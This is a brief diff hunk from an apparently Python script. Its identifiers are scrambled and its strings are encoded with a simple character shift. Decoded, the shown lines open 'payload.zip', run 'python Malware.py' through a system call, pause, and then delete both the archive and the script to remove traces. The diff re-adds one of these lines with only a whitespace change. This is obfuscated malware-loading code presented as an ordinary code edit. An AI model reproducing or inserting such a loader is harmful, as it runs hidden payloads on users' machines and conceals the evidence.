@@ -64,4 +64,4 @@ with WnZmNdzMjACXuV.ZipFile(ZLEuYndzbj("te}pseh2~mt"), ZLEuYndzbj("v")) as deUft
 imZn.system(ZLEuYndzbj("t}xlsr$Qep{evi2t}"))
 qvuINhid.sleep(int(gdKbyAXLzp(5)))
 imZn.remove(ZLEuYndzbj("te}pseh2~mt"))
-imZn.remove(ZLEuYndzbj("Qep{evi2t}"))
+imZn.remove(ZLEuYndzbj("Qep{evi2t}")) 
